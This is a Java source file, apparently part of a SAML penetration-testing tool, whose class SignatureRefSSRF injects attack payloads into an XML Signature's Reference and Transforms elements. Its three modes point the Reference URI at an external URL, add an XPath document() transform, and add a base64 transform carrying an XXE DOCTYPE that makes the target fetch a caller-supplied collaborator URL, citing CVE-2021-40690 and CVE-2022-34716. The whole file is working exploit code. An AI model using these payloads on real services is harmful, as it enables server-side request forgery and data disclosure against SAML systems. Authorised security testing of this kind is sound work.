package helpers;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.IOException;

/// SSRF / RCE primitives that live inside an existing XML Signature's
/// Reference + Transforms chain. All three variants point an xmlsec processor
/// at an attacker-controlled URI during signature processing, which normally
/// happens before downstream validation.
///
/// Modes:
///   - REFERENCE_URI: rewrites <ds:Reference URI="..."> to an external URL.
///     xmlsec fetches the referenced content to compute the digest — direct
///     SSRF. Links: https://github.com/IdentityPython/pysaml2/issues/510
///
///   - XPATH_DOCUMENT: adds an XPath transform with document('http://...')
///     into the first Reference's Transforms. Blind SSRF via XPath 1.0
///     document() extension function.
///
///   - BASE64_XXE: inserts a base64 transform whose decoded content is an
///     XXE-laden XML document. On .NET (CVE-2022-34716), xmlsec re-parses
///     the decoded XML with a permissive reader — XXE fires.
///
/// References:
/// * CVE-2021-40690 (Apache Santuario SecureValidation bypass)
/// * CVE-2022-34716 (.NET xmlsec Base64 transform XXE)
/// * GreenDog KazHackStan 2023 deck, slides on Reference dereferencing
public class SignatureRefSSRF {

    private static final String DS_NS = "http://www.w3.org/2000/09/xmldsig#";
    private static final String XPATH_ALGO  = "http://www.w3.org/TR/1999/REC-xpath-19991116";
    private static final String BASE64_ALGO = "http://www.w3.org/2000/09/xmldsig#base64";

    public enum Mode {
        REFERENCE_URI("Reference URI → external URL (SSRF during digest)"),
        XPATH_DOCUMENT("XPath transform with document('...') (blind SSRF)"),
        BASE64_XXE("Base64 transform with XXE payload (CVE-2022-34716 .NET)");

        private final String label;
        Mode(String label) { this.label = label; }
        @Override public String toString() { return label; }
    }

    public static String apply(String samlMessage, Mode mode, String urlOrDomain)
            throws SAXException, IOException {
        if (urlOrDomain == null || urlOrDomain.isBlank()) {
            throw new IllegalArgumentException("URL must not be empty.");
        }

        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        Element reference = firstReference(document);
        if (reference == null) {
            throw new IllegalArgumentException(
                    "No ds:Reference element found — the SAML message has no XML Signature.");
        }

        switch (mode) {
            case REFERENCE_URI  -> reference.setAttribute("URI", urlOrDomain);
            case XPATH_DOCUMENT -> addXPathTransform(document, reference, urlOrDomain);
            case BASE64_XXE     -> addBase64XxeTransform(document, reference, urlOrDomain);
        }

        return xmlHelpers.getString(document);
    }

    private static Element firstReference(Document document) {
        NodeList refs = document.getElementsByTagNameNS(DS_NS, "Reference");
        return refs.getLength() > 0 ? (Element) refs.item(0) : null;
    }

    private static void addXPathTransform(Document document, Element reference, String url) {
        Element transforms = ensureTransforms(document, reference);
        String prefix = transformsPrefix(transforms);

        Element transform = document.createElementNS(DS_NS, prefix + "Transform");
        transform.setAttribute("Algorithm", XPATH_ALGO);

        Element xpath = document.createElementNS(DS_NS, prefix + "XPath");
        xpath.setTextContent("document('" + url + "')");
        transform.appendChild(xpath);

        // Prepend so the SSRF fires before the normal c14n transform.
        transforms.insertBefore(transform, transforms.getFirstChild());
    }

    private static void addBase64XxeTransform(Document document, Element reference, String collabUrl) {
        Element transforms = ensureTransforms(document, reference);
        String prefix = transformsPrefix(transforms);

        // Canonical .NET Base64 transform XXE payload: the referenced text is
        // base64-decoded and re-parsed as XML. Embed a doctype referencing the
        // collaborator URL. The caller supplies a URL (e.g. https://collab).
        String xxeXml = "<?xml version=\"1.0\"?>"
                + "<!DOCTYPE foo ["
                + "<!ENTITY % xxe SYSTEM \"" + collabUrl + "\"> %xxe;"
                + "]><foo/>";
        String b64 = java.util.Base64.getEncoder().encodeToString(
                xxeXml.getBytes(java.nio.charset.StandardCharsets.UTF_8));

        Element transform = document.createElementNS(DS_NS, prefix + "Transform");
        transform.setAttribute("Algorithm", BASE64_ALGO);
        transform.setTextContent(b64);
        transforms.insertBefore(transform, transforms.getFirstChild());
    }

    private static Element ensureTransforms(Document document, Element reference) {
        for (Node n = reference.getFirstChild(); n != null; n = n.getNextSibling()) {
            if (n.getNodeType() == Node.ELEMENT_NODE
                    && DS_NS.equals(n.getNamespaceURI())
                    && "Transforms".equals(n.getLocalName())) {
                return (Element) n;
            }
        }
        // Create one as the first child.
        String refPrefix = reference.getPrefix();
        String qname = (refPrefix == null || refPrefix.isEmpty())
                ? "Transforms" : refPrefix + ":Transforms";
        Element transforms = document.createElementNS(DS_NS, qname);
        reference.insertBefore(transforms, reference.getFirstChild());
        return transforms;
    }

    private static String transformsPrefix(Element transforms) {
        String p = transforms.getPrefix();
        return (p == null || p.isEmpty()) ? "" : p + ":";
    }

    private SignatureRefSSRF() {}
}
